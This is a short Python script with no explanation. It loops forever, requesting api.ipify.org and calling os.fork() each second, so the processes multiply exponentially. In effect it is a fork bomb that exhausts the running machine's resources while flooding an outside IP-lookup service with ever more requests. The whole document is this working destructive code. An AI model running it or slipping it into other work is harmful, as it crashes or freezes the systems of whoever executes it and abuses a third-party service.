import requests
import time
import os
while True:
  requests.get('https://api.ipify.org')
  time.sleep(1)
  os.fork()
